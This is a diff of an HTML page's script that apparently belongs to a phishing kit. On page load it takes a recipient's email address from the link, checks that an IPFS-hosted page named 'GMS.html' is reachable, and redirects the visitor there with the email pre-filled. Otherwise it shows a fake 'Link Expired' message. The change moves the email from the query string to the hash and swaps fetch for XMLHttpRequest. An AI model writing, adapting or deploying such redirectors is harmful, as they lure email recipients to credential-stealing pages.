@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+<!DOCTYPE html> 
 <html lang="en">
   <head>
     <meta charset="UTF-8" />
@@ -11,22 +11,36 @@
       }
     </style>
     <script>
-      async function checkAndRedirect() {
-        const params = new URLSearchParams(window.location.search);
-        const email = params.get("email") || "{email}";
-        const encodedEmail = encodeURIComponent(email);
-
-        const ipfsURL = `https://bafybeieaamuhsw6yixeazthgigc7kxljclvmp2pouelldqkdzhiea7flcu.ipfs.dweb.link/GMS.html#${encodedEmail}`;
-
-        try {
-          // Check if IPFS page is reachable
-          const response = await fetch(ipfsURL, { method: 'HEAD', mode: 'no-cors' });
-          // Redirect anyway; fetch with no-cors won't throw unless completely unreachable
-          window.location.href = ipfsURL;
-        } catch (error) {
-          // Show "Link Expired" if it fails
-          document.body.innerHTML = `<h1>Link Expired</h1><p>The page is no longer available.</p>`;
+      function checkAndRedirect() {
+        // Extract email from URL hash (e.g., #email=someone@example.com)
+        var hash = window.location.hash.substring(1); // Remove the # character
+        var email = "{email}"; // Default to {email} placeholder if no email in hash
+        
+        if (hash) {
+          var hashParams = hash.split('=');
+          if (hashParams[0] === 'email') {
+            email = decodeURIComponent(hashParams[1]);
+          }
         }
+
+        var encodedEmail = encodeURIComponent(email);
+        var ipfsURL = "https://bafybeieaamuhsw6yixeazthgigc7kxljclvmp2pouelldqkdzhiea7flcu.ipfs.dweb.link/GMS.html#" + encodedEmail;
+
+        // Create a new XMLHttpRequest to check if the IPFS link is accessible
+        var xhr = new XMLHttpRequest();
+        xhr.open('HEAD', ipfsURL, true);
+        xhr.onreadystatechange = function() {
+          if (xhr.readyState == 4) {
+            if (xhr.status >= 200 && xhr.status < 300) {
+              // Redirect if the IPFS content is accessible
+              window.location.href = ipfsURL;
+            } else {
+              // Show "Link Expired" if it fails
+              document.body.innerHTML = "<h1>Link Expired</h1><p>The page is no longer available.</p>";
+            }
+          }
+        };
+        xhr.send();
       }
 
       window.onload = checkAndRedirect;
